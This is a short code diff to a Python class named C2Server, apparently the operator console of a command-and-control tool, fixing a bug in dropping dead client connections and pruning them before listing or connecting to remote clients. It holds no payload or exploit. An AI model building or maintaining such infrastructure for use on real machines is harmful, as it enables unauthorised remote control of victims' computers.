@@ -79,7 +79,7 @@ class C2Server:
             self.clients.remove(client)
 
     def remove_dead(self):
-        for checkclient in self.clients():
+        for checkclient in self.clients:
             response = self.send_command("info")
             if response == "":
                 self.clients.remove(checkclient)
@@ -131,6 +131,7 @@ if __name__ == "__main__":
                 items[0] = "Start Server"
                 running = False
         elif choice == 1: 	 #List Clients
+            server.remove_dead()
             if len(server.clients) > 0:
                 log.info("FORMAT: ('REMOTE ADDR', REMOTE PORT)")
                 for client in server.clients:
@@ -141,6 +142,7 @@ if __name__ == "__main__":
                 log.info("No clients connected")
         elif choice == 2:	# Connect to a Client
                 if len(server.clients) > 0:
+                    server.remove_dead()
                     targets = []
                     for client in server.clients:
                         format = str(client).split("raddr=")
